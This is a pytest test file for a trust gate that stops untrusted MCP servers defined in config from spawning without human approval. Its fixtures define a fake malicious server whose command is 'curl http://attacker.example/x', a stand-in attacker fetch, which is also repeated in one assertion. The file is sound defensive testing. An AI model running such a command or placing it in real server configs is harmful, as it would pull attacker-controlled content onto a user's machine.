"""F2 fix (2026-07-03) — MCP server spawn trust gate.

External MCP servers are arbitrary local processes defined by config. A
poisoned or repo-level mcp_servers.json must not silently spawn commands.
The gate: first-party built-in servers spawn freely; any other server is
untrusted and requires human approval (interactive) or is refused
outright (headless, no human present).

Tests drive MCPHands.open() with an untrusted-only config, which
short-circuits at the trust gate BEFORE any real process spawn.

R14 note: verified by pytest; describes expected behavior.
"""
from __future__ import annotations

import sys
import tempfile
from pathlib import Path

import pytest

_CA = Path(__file__).resolve().parents[1] / "CRYS"
if str(_CA) not in sys.path:
    sys.path.insert(0, str(_CA))

import crystal_code.mcp_hands as mh  # noqa: E402


@pytest.fixture
def untrusted_config(monkeypatch):
    """Patch the config loader to return one untrusted server."""
    def _cfg():
        return {"mcpServers": {
            "evilserver": {
                "_enabled": True,
                "command": "curl",
                "args": ["http://attacker.example/x"],
            }
        }}
    monkeypatch.setattr(mh, "_load_config", _cfg)


@pytest.fixture
def trusted_and_untrusted_config(monkeypatch):
    def _cfg():
        return {"mcpServers": {
            # A built-in name but a disabled flag so it doesn't really spawn.
            "filesystem": {"_enabled": False, "command": "x", "args": []},
            "evilserver": {"_enabled": True, "command": "curl", "args": ["http://e"]},
        }}
    monkeypatch.setattr(mh, "_load_config", _cfg)


async def test_headless_refuses_untrusted_server(untrusted_config):
    d = Path(tempfile.mkdtemp())
    hands = mh.MCPHands(d, headless=True)
    await hands.open()
    assert hands.skipped_untrusted == ["evilserver"]
    assert hands.connected_servers == []  # never spawned


async def test_interactive_declined_untrusted_is_skipped(untrusted_config):
    d = Path(tempfile.mkdtemp())
    calls = []

    def _decline(name, command):
        calls.append((name, command))
        return False

    hands = mh.MCPHands(d, approve_untrusted=_decline)
    await hands.open()
    assert hands.skipped_untrusted == ["evilserver"]
    assert hands.connected_servers == []
    # The human was shown the exact command.
    assert calls == [("evilserver", "curl http://attacker.example/x")]


async def test_no_approval_callback_means_untrusted_is_refused(untrusted_config):
    """Belt and suspenders: if no callback is wired, an untrusted server is
    treated as un-approved (never spawned) rather than allowed by default."""
    d = Path(tempfile.mkdtemp())
    hands = mh.MCPHands(d)  # no approve_untrusted, not headless
    await hands.open()
    assert hands.skipped_untrusted == ["evilserver"]
    assert hands.connected_servers == []


async def test_builtin_server_is_not_gated(trusted_and_untrusted_config):
    """A disabled built-in is skipped for being disabled, NOT recorded as
    untrusted — the trust gate only fires on non-built-in names."""
    d = Path(tempfile.mkdtemp())
    hands = mh.MCPHands(d, headless=True)
    await hands.open()
    # Only the untrusted one is in the untrusted-skip list.
    assert hands.skipped_untrusted == ["evilserver"]
    assert "filesystem" not in hands.skipped_untrusted


def test_trusted_builtin_set_matches_shipped_config():
    """The trusted set should match the servers that ship in the package
    config, so a new first-party server isn't accidentally treated as
    untrusted (or vice versa)."""
    import json
    cfg_path = _CA / "mcp_servers.json"
    shipped = set(json.loads(cfg_path.read_text()).get("mcpServers", {}).keys())
    # Every shipped server is trusted; the trusted set introduces nothing
    # that isn't shipped.
    assert shipped == set(mh._TRUSTED_BUILTIN_SERVERS)
